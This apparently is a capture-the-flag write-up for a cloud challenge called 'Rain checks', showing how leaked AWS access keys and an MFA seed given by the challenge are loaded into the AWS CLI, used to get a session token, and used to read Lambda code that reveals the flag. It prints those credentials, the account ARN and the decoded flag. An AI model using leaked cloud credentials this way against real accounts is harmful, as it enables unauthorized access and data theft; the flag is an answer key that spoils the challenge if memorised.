# Rain checks

## Overview

This was a cloud challenge. It provided some leaked AWS credentials and a policy JSON with some permissions.

## Solution

```
AKIA22D7J5LEAGT3CKGP <- Access key
ByaBJ7YFJnjXW8R88VOht+DFDRnS8R553UXPFon3 <- Secret key
E3HGFFMHZDLJG2WAEO5FOLMB3GGVVKQNOAIIQ5TIBVBZ4G773RPB47QVC3QTZSJV <- MFA key
arn:aws:iam::743296330440:mfa/mfa-exposed-user <- MFA ARN
```

Create a new aws configuration with the region `eu-central-1` (from the json file)
```
$ aws configure --profile nullcon
AWS Access Key ID [None]: AKIA22D7J5LEAGT3CKGP
AWS Secret Access Key [None]: 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
Default region name [None]: eu-central-1
Default output format [None]:
```

Import the MFA key into an authenticator app. I used Authy and generated a QR code using this site https://stefansundin.github.io/2fa-qr/

Login using the MFA token
```
$ aws sts get-session-token --serial-number arn:aws:iam::743296330440:mfa/mfa-exposed-user --profile nullcon --token-code 174257
```

Set the following environment variables with the output from the last command
```
$ export AWS_ACCESS_KEY_ID=ASIAIOSFODNN7EXAMPLE
$ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
$ export AWS_SESSION_TOKEN=AQoDYXdzEJr...
```

Get the function information from the JSON file

We can download the code but it is not useful in this case. Trying to invoke/update the function doesn't work, because the current user is missing those permissions.

The function has the description "lambda function that checks the current secret value. Both, the lambda code and the secret are protected against editing by lambda-aws-config-confirm-state-of-lambda and lambda-aws-config-confirm-state-of-secrets"

Getting the function information for `lambda-aws-config-confirm-state-of-lambda` and `lambda-aws-config-confirm-state-of-secrets`

Downloading the code for those function we find the correct secret in `lambda-aws-config-confirm-state-of-secrets`

```python
def correct_secret():
    secret_name = "flag1"
    region_name = "eu-central-1"

    session = boto3.session.Session()
    client = session.client(
        service_name='secretsmanager',
        region_name=region_name
    )

    response = client.put_secret_value(
    SecretId=secret_name,
    SecretString=base64.b64decode('RU5Pe04wX0VkMXRfU3QxbGxfVnVsbn0='))
```

```
$ $echo RU5Pe04wX0VkMXRfU3QxbGxfVnVsbn0= | base64 -d
ENO{N0_Ed1t_St1ll_Vuln}
```